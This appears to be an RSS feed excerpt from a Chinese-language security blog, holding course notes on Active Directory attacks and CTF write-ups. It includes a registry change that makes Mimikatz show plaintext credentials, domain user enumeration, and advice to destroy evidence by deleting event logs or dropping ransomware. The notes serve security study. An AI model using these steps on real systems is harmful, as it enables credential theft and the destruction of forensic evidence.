Sysinternals - www.sysinternals.com
RW C:\Program Files
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab-time---本地提權">
 Lab Time - 本地提權
 &lt;a class="anchor" href="#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h2>
&lt;h3 id="錯誤配置">
 ==錯誤配置==
 &lt;a class="anchor" href="#%e9%8c%af%e8%aa%a4%e9%85%8d%e7%bd%ae">#&lt;/a>
&lt;/h3>
&lt;p>找出low有存取權限的service檔案&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/</guid><description>&lt;h1 id="ntustisc---ad-note---lab顯示mimikatz的明文">
 NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%a1%af%e7%a4%bamimikatz%e7%9a%84%e6%98%8e%e6%96%87">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>之前在進行mimikatz的實作時，會看到很多wdigest是(null)的情況，主要原因是windows的設定的問題，所以只要把設定改回來，就可以正常顯示了，主要是windows不主動存取明文密碼&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.sohu.com/a/569244434_121124375">What is WDigest&lt;/a>
&lt;blockquote>
&lt;p>WDigest即摘要身份驗證，摘要身份驗證是一種質詢/響應協議，主要在WindowsServer2003中用於LDAP和基於Web的身份驗證。它利用超文本傳輸協議(HTTP)和簡單身份驗證安全層(SASL)交換進行身份驗證&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows-server/identity/ad-ds/manage/understand-security-identifiers">什麼是安全性識別碼？&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>安全性識別碼可用來唯一識別安全性主體或安全性群組。 安全性主體可以代表可由作業系統驗證的任何實體，例如使用者帳戶、電腦帳戶，或在使用者或電腦帳戶的安全性內容中執行的執行緒或進程。&lt;/p>
&lt;p>每個帳戶或群組，或帳戶安全性內容中執行的每個進程，都有由授權單位發出的唯一 SID，例如 Windows 網域控制站。 SID 會儲存在安全性資料庫中。 系統會產生 SID，以識別建立帳戶或群組時的特定帳戶或群組。 當 SID 做為使用者或群組的唯一識別碼時，永遠不會再次用來識別其他使用者或群組。&lt;/p>&lt;/blockquote>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="顯示mimikatz的明文">
 ==顯示Mimikatz的明文==
 &lt;a class="anchor" href="#%e9%a1%af%e7%a4%bamimikatz%e7%9a%84%e6%98%8e%e6%96%87">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>只要打開regedit，在&lt;code>電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&lt;/code>可能會看到&lt;code>UseLogonCredential&lt;/code>的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增
&lt;img src="https://hackmd.io/_uploads/BkQAC8ERn.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>重開機
重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Result
我挑了幾個SID一樣的結果來看
&lt;img src="https://hackmd.io/_uploads/HktIkvVA2.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/B1uqyDE02.png" alt="" />
左邊的是新增config之前，右邊的是重開機之後，可以看到原本(null)的地方大部分都有被顯示出來&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>NTUSTISC - AD Note - 會後提及有用的工具</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/</guid><description>&lt;h1 id="ntustisc---ad-note---會後提及有用的工具">
 NTUSTISC - AD Note - 會後提及有用的工具
 &lt;a class="anchor" href="#ntustisc---ad-note---%e6%9c%83%e5%be%8c%e6%8f%90%e5%8f%8a%e6%9c%89%e7%94%a8%e7%9a%84%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=JAnGtFoJlij-03nk&amp;amp;t=6024">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="edrendpoint-detection-and-response">
 &lt;a href="https://www.trendmicro.com/zh_tw/what-is/xdr/edr.html">EDR(Endpoint Detection and Response)&lt;/a>
 &lt;a class="anchor" href="#edrendpoint-detection-and-response">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>端點偵測及回應 (EDR) 結合了即時的持續監控、端點資料蒐集，以及進階交叉關聯，來偵測並回應主機和端點連線的可疑活動。這套方法可讓資安團隊快速發掘並交叉分析各種活動來產生高可信度的偵測事件，並提供手動和自動化回應選項。&lt;/p>
&lt;p>EDR 解決方案會記錄端點上發生的所有活動和事件。某些廠商或許還會將這項服務延伸至任何與您網路相連的工作負載。然後，這些記錄 (或事件記錄檔) 可用來發掘原本不會被發現的資安事件。即時的監控可以更快偵測威脅，不讓威脅有機會擴散至使用者端點之外。&lt;/p>&lt;/blockquote>
&lt;p>其實就是把我們感興趣的log抓出來而已&lt;/p>
&lt;h3 id="xdrextended-detection-and-response">
 &lt;a href="https://www.trendmicro.com/zh_tw/what-is/xdr.html">XDR(Extended detection and response)&lt;/a>
 &lt;a class="anchor" href="#xdrextended-detection-and-response">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>XDR (延伸式偵測及回應) 可蒐集並自動交叉關聯涵蓋多個防護層的資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此可藉由資安分析來提供更快的威脅偵測，提升調查與回應時間。&lt;/p>
&lt;p>XDR 能打破資安產品之間的藩籬，採用一種全方位面面俱到的偵測及回應方法。XDR 可蒐集並透過交叉關聯涵蓋多個防護層的偵測事件與深入的活動資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此豐富的資料若能透過自動化分析，就能更快偵測威脅，同時也讓資安分析師擁有適當的工具可完成更多任務，並透過調查來採取更迅速的行動。
&lt;img src="https://www.trendmicro.com/content/dam/trendmicro/global/en/what-is/xdr/XDR-new-market-iture.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>簡單來說EDR只能特定範圍或是單一產品上做到端點偵測，但XDR是能夠跨各個資安產品或是layer達到更全面的偵測以及比對事件的結果&lt;/p>
&lt;h3 id="mdrmanaged-detection-and-response">
 &lt;a href="https://ithelp.ithome.com.tw/articles/10307982">MDR(Managed Detection and Response)&lt;/a>
 &lt;a class="anchor" href="#mdrmanaged-detection-and-response">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>提供專業的資安人員來協助企業進行監控網路、分析事件、並且回應所遭遇的資安狀況如何做出對應的應變&lt;/p>
&lt;ul>
&lt;li>是一種服務&lt;/li>
&lt;li>藉由資安專家的服務，提供及時、有效的處理，以避免損失擴大&lt;/li>
&lt;li>將安全專業知識外包給專業的人員&lt;/li>
&lt;li>分析警示當中潛藏的危險徵兆&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;h3 id="如何滅證">
 如何滅證
 &lt;a class="anchor" href="#%e5%a6%82%e4%bd%95%e6%bb%85%e8%ad%89">#&lt;/a>
&lt;/h3>
&lt;p>只要讓windows保持預設值或是把event file砍掉就好了，因為windows10會記錄很多使用者的狀況，例如Quick Access的使用路徑或是使用者之前使用過的應用程式的縮圖等等，所以最暴力的方式是離開之前丟一個勒索病毒，它就會針對常見的file進行加密，這樣縱使不把東西刪掉，鑑識人員也不會知道裡面的內容是甚麼&lt;/p>
&lt;h3 id="如果正在使用win20082012">
 如果正在使用Win2008/2012
 &lt;a class="anchor" href="#%e5%a6%82%e6%9e%9c%e6%ad%a3%e5%9c%a8%e4%bd%bf%e7%94%a8win20082012">#&lt;/a>
&lt;/h3>
&lt;p>請趕快升級成Win2016，因為有很多攻擊手段是到win2016的就失效的，例如前面提到的wdigest在2008/2012是會開的，因為這樣在認證上才會成功&lt;/p>
&lt;h3 id="什麼是誘捕系統honey-pot">
 &lt;a href="https://www.ithome.com.tw/news/27824">什麼是誘捕系統（Honey Pot）？&lt;/a>
 &lt;a class="anchor" href="#%e4%bb%80%e9%ba%bc%e6%98%af%e8%aa%98%e6%8d%95%e7%b3%bb%e7%b5%b1honey-pot">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>就像是一罐用來吸引、捕捉昆蟲的蜂蜜，所謂的誘捕系統（Honey Pot）就是一個吸引攻擊者的目標，透過誘捕的手法，吸引駭客發動攻擊，以蒐集攻擊者的來源以及攻擊手法，現在除了應用在蒐集病毒特徵、攻擊手法，也用來蒐集假網站的IP，以及散布木馬或間諜程式等惡意來源名單，藉此觀察病蠕蟲、駭客入侵或惡意攻擊的來源、手段、管道及模式，由於會將所有攻擊動作與過程記錄下來，已經成為蒐集駭客資訊的重要方式之ㄧ。&lt;/p></description></item><item><title>NTUSTISC - AD Note - 環境建置 &amp; Background</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/</guid><description>&lt;h1 id="ntustisc---ad-note---環境建置--background">
 NTUSTISC - AD Note - 環境建置 &amp;amp; Background
 &lt;a class="anchor" href="#ntustisc---ad-note---%e7%92%b0%e5%a2%83%e5%bb%ba%e7%bd%ae--background">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>What is Directory Service?&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://i.imgur.com/QVJYCoG.jpg" alt="" />
Windows Server 系統使用的目錄服務 就是 Active Directory&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>What is Active Directory(AD)?&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;/p>
&lt;blockquote>
&lt;p>Windows的Windows Server中，負責架構中大型網路環境的集中式目錄管理服務(Directory Services)，他處理在組織中的網路物件，物件可以是&lt;font color="FF0000">使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系&lt;/font>等等，只要是在AD結構定義檔(Schema)中定義的物件，就可以儲存在AD資料檔中，並利用AD Service Interface來存取&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>What is Domain Service?&lt;sup id="fnref1:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://i.imgur.com/k2ma2Nf.jpg" alt="" />
執行 AD DS 的伺服器稱為 domain controllers (DCs)&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>What is LDAP?&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>
:::info&lt;/p>
&lt;blockquote>
&lt;p>輕量型目錄存取協定 (LDAP) 是用來從 Active Directory 讀取資料，及將資料寫入 Active Directory 的標準協定。某些應用程式使用 LDAP 新增、移除或搜尋 Active Directory 中的使用者和群組，或是傳輸登入資料來驗證 Active Directory 中的使用者。每個 LDAP 通訊都包括用戶端 (如應用程式) 和伺服器 (例如 Active Directory)。
:::&lt;/p></description></item><item><title>NTUSTISC - AD Note(Lab - 查詢網域使用者)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/</guid><description>&lt;h1 id="ntustisc---ad-notelab---查詢網域使用者">
 NTUSTISC - AD Note(Lab - 查詢網域使用者)
 &lt;a class="anchor" href="#ntustisc---ad-notelab---%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e4%bd%bf%e7%94%a8%e8%80%85">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="查詢網域使用者">
 ==查詢網域使用者==
 &lt;a class="anchor" href="#%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e4%bd%bf%e7%94%a8%e8%80%85">#&lt;/a>
&lt;/h3>
&lt;p>常用的cheat sheet&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net user /domain
$ net user &amp;lt;username&amp;gt; /domain
&lt;/code>&lt;/pre>&lt;p>:::spoiler Implementation&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net user /domain
這項要求會在網域 kuma.org 下的網域控制站處理。


\\WIN-818G5VCOLJO.kuma.org 的使用者帳戶

-------------------------------------------------------------------------------
Administrator aleda.appolonia alikee.perri
aloise.elfrida amabelle.gayle andree.suki
angelique.hilda annice.eden anya.gypsy
audi.rosalind babb.joanne bambi.etta
bear berget.celka berna.raphaela
berny.kirby bill.marylee caitrin.latia
carey.kincaid carlye.chloette carmelle.libbi
casandra.cherrita casi.hyacinth cassondra.lothario
celeste.kelci charis.kory christi.nettle
coraline.mahalia corine.celesta cyndie.rhodie
daile.odetta darlleen.dorisa DefaultAccount
dollie.fayina dominica.carmon dorrie.paolina
eba.luca ella.randee erena.elinore
fara.iseabal fred.carmita gabriel.diannne
garnet.constancia gertrude.felecia gillian.marsiella
giulietta.moyra glenda.dorrie Guest
henrieta.sabine herminia.debby issy.eudora
jerrie.morganne jessa.corinna jori.floria
joyann.sibella kaja.brenda karoly.nadeen
katee.annemarie katharina.alyssa kiri.kath
kizzee.margaux krbtgt laurena.mirelle
lazaro.karoly lilas.lindy lily.kristofor
lina.allene linda.neda logan.janeen
lon.sonni lorne.celie lucilia.lelah
margo.sharl marlyn.loralee marney.ranee
martita.juanita marylynne.susannah maurizia.ines
mercy.edi moyra.fanechka nolana.rivy
ollie.dorita orelee.peri ortensia.fancy
philippa.eugenie philis.gilli pietra.fern
randene.lelah ranee.delinda reina.claire
renae.babette reyna.gwendolyn ricca.stefa
ronni.kristoforo rosetta.lotta ruthann.britta
ruthie.ebony seana.jeanette selestina.cassi
shantee.marylin sherri.jacquetta sile.rhiamon
sofie.darlleen star.rikki stormie.natala
命令已經成功完成。
&lt;/code>&lt;/pre>&lt;p>:::
說明：如果目前登入的帳號是在domain底下，就會出現類似如上的結果，會有一大堆使用者，但是目前的帳號沒有在該domain底下，會出現以下error:&lt;/p></description></item><item><title>NTUSTISC - CyberDefender - MrRobot - Target 1</title><link>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/</guid><description>&lt;h1 id="ntustisc---cyberdefender---mrrobot---target-1">
 NTUSTISC - CyberDefender - MrRobot - Target 1
 &lt;a class="anchor" href="#ntustisc---cyberdefender---mrrobot---target-1">#&lt;/a>
&lt;/h1>
&lt;p>Challenge: &lt;a href="https://cyberdefenders.org/blueteam-ctf-challenges/88">https://cyberdefenders.org/blueteam-ctf-challenges/88&lt;/a>
Target 2: &lt;a href="https://hackmd.io/@SBK6401/HJz2FPne6">https://hackmd.io/@SBK6401/HJz2FPne6&lt;/a>
POS: &lt;a href="https://hackmd.io/@SBK6401/BJpJqDhlp">https://hackmd.io/@SBK6401/BJpJqDhlp&lt;/a>&lt;/p>
&lt;p>:::spoiler TOC
[TOC]
:::
Lecture Video: &lt;a href="https://youtu.be/4u5ckjfFRuM?si=MKeBkxyz5vcnsJfh"> 2022/06/29 藍隊安全系列課程 04 &lt;/a>
&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">Volatility - Cheat Sheet&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>vmss2core
題目下載之後會得到一些.vmss的檔案，這時候就需要下載&lt;a href="https://flings.vmware.com/vmss2core">vmss2core.exe&lt;/a>，.vmss是VMware經過轉換的snapshot，而這個工具可以把snapshot轉換成memory dump
:::spoiler Execution Result
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ vmss2core-sb-8456865.exe -W .&lt;span style="color:#ae81ff">\c&lt;/span>69-Grrcon2015&lt;span style="color:#ae81ff">\p&lt;/span>os01&lt;span style="color:#ae81ff">\P&lt;/span>OS-01-c4e8f786.vmss
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vmss2core version &lt;span style="color:#ae81ff">8456865&lt;/span> Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> 1998-2017 VMware, Inc. All rights reserved.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... &lt;span style="color:#ae81ff">10&lt;/span> MBs written.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... &lt;span style="color:#ae81ff">20&lt;/span> MBs written.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... &lt;span style="color:#ae81ff">30&lt;/span> MBs written.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... &lt;span style="color:#ae81ff">1020&lt;/span> MBs written.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Finished writing core.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>Volatility3: 安裝可以直接參考影片，建議直接使用windows exe protable file，這樣比較方便也穩定，而且還不需要擔心環境的問題&lt;/li>
&lt;/ul>
&lt;h2 id="lab---target-1">
 Lab - Target 1
 &lt;a class="anchor" href="#lab---target-1">#&lt;/a>
&lt;/h2>
&lt;h3 id="起手式">
 起手式
 &lt;a class="anchor" href="#%e8%b5%b7%e6%89%8b%e5%bc%8f">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python vol.py -f memory.dmp imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 &lt;span style="color:#f92672">(&lt;/span>Instantiated with WinXPSP2x86&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : WindowsCrashDumpSpace32 &lt;span style="color:#f92672">(&lt;/span>Unnamed AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer3 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>D:&lt;span style="color:#ae81ff">\D&lt;/span>ownloads&lt;span style="color:#ae81ff">\T&lt;/span>rash&lt;span style="color:#ae81ff">\C&lt;/span>yberDefenders&lt;span style="color:#ae81ff">\c&lt;/span>69-Grrcon2015&lt;span style="color:#ae81ff">\t&lt;/span>arget1&lt;span style="color:#ae81ff">\m&lt;/span>emory.dmp&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x3ecc3260L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2015-10-09 12:53:02 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2015-10-09 08:53:02 -0400
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>重要資訊System Name: Win7SP0x86&lt;/p></description></item><item><title>Pentest Tools Survey</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/tool/pentest-tools-survey/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/tool/pentest-tools-survey/</guid><description>&lt;h1 id="mobile-application-security-penetration-testing-based-on-owasp">
 Mobile Application Security Penetration Testing Based on OWASP
 &lt;a class="anchor" href="#mobile-application-security-penetration-testing-based-on-owasp">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Alanda, A., Satria, D., Mooduto, H. A., &amp;amp; Kurniawan, B. (2020, May). Mobile application security penetration testing based on OWASP. In IOP Conference Series: Materials Science and Engineering (Vol. 846, No. 1, p. 012036). IOP Publishing.
:::&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>研究針對Android行動應用程式安全性進行滲透測試,主要基於OWASP(開放式Web應用程式安全專案)的10大行動應用程式弱點。測試結果顯示,有80%的測試應用程式存在OWASP Mobile Top 10所列出的弱點，研究提供了各種弱點的測試方法與結果分析,並給出相應的安全修復建議,以增強Android行動應用程式的安全性。&lt;/p>
&lt;h1 id="以-andorid-實驗案例探討-owasp-行動裝置應用程式之十大威脅">
 以 Andorid 實驗案例探討 OWASP 行動裝置應用程式之十大威脅
 &lt;a class="anchor" href="#%e4%bb%a5-andorid-%e5%af%a6%e9%a9%97%e6%a1%88%e4%be%8b%e6%8e%a2%e8%a8%8e-owasp-%e8%a1%8c%e5%8b%95%e8%a3%9d%e7%bd%ae%e6%87%89%e7%94%a8%e7%a8%8b%e5%bc%8f%e4%b9%8b%e5%8d%81%e5%a4%a7%e5%a8%81%e8%84%85">#&lt;/a>
&lt;/h1>
&lt;p>:::info
許振銘, &amp;amp; 許登凱. (2014). 以 Andorid 實驗案例探討 OWASP 行動裝置應用程式之十大威脅. Communications of the CCISA, 20(2), 77-96.
:::&lt;/p></description></item><item><title>PicoCTF - `tunn3l v1s10n`</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/</guid><description>&lt;h1 id="picoctf---tunn3l-v1s10n">
 PicoCTF - &lt;code>tunn3l v1s10n&lt;/code>
 &lt;a class="anchor" href="#picoctf---tunn3l-v1s10n">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/112?category=4&amp;amp;page=1">tunn3l v1s10n&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.jinnsblog.com/2009/08/bmp-format-graphic-illustration.html">[筆記] BMP點陣圖格式說明&lt;/a>&lt;/p>
&lt;h2 id="exploit---recover-file">
 Exploit - Recover file
 &lt;a class="anchor" href="#exploit---recover-file">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Analyze
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ exiftool tunn3l_v1s10n
ExifTool Version Number : 11.88
File Name : tunn3l_v1s10n
Directory : .
File Size : 2.8 MB
File Modification Date/Time : 2023:02:17 04:11:33+08:00
File Access Date/Time : 2023:02:17 04:12:37+08:00
File Inode Change Date/Time : 2023:02:17 04:11:35+08:00
File Permissions : rw-r--r--
File Type : BMP
File Type Extension : bmp
MIME Type : image/bmp
BMP Version : Unknown (53434)
Image Width : 1134
Image Height : 306
Planes : 1
Bit Depth : 24
Compression : None
Image Length : 2893400
Pixels Per Meter X : 5669
Pixels Per Meter Y : 5669
Num Colors : Use BitDepth
Num Important Colors : All
Red Mask : 0x27171a23
Green Mask : 0x20291b1e
Blue Mask : 0x1e212a1d
Alpha Mask : 0x311a1d26
Color Space : Unknown (,5%()
Rendering Intent : Unknown (826103054)
Image Size : 1134x306
Megapixels : 0.347
&lt;/code>&lt;/pre>It seems a &lt;code>bmp&lt;/code> file and check the file signature of the 2 bytes is &lt;code>42 4D&lt;/code> :heavy_check_mark:&lt;/li>
&lt;li>Check file headers
According to &lt;a href="https://en.wikipedia.org/wiki/BMP_file_format">BMP_file_format&lt;/a> and &lt;a href="https://www.jinnsblog.com/2009/08/bmp-format-graphic-illustration.html">BMP點陣圖格式說明&lt;/a>
&lt;img src="https://i.imgur.com/YU6exro.png" alt="" />
&lt;ul>
&lt;li>:heavy_check_mark:size: &lt;code>8E 26 2C 00&lt;/code> $\to$ &lt;code>0x2C268E&lt;/code> $\to$ &lt;code>2893454 bytes&lt;/code>
&lt;img src="https://i.imgur.com/H6G44kT.png" alt="" />&lt;/li>
&lt;li>:heavy_check_mark:reserved1: &lt;code>00 00&lt;/code>&lt;/li>
&lt;li>:heavy_check_mark:reserved2: &lt;code>00 00&lt;/code>&lt;/li>
&lt;li>:negative_squared_cross_mark:offset: &lt;code>BA D0 00 00&lt;/code> $\to$ &lt;code>0xD0BA&lt;/code> $\to$ &lt;code>53434&lt;/code> means it&amp;rsquo;ll read the bitmap data from offset 53434 bytes. But actually, the data of bitmap is just connect with the header. So, we just need to shift 14 bytes for file header + 40 bytes for info header = 54 bytes $\to$ &lt;code>0x36&lt;/code>
&lt;img src="https://i.imgur.com/crETYOD.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>We can peek the data first&amp;hellip;
&lt;img src="https://i.imgur.com/DWesnDl.png" alt="" />
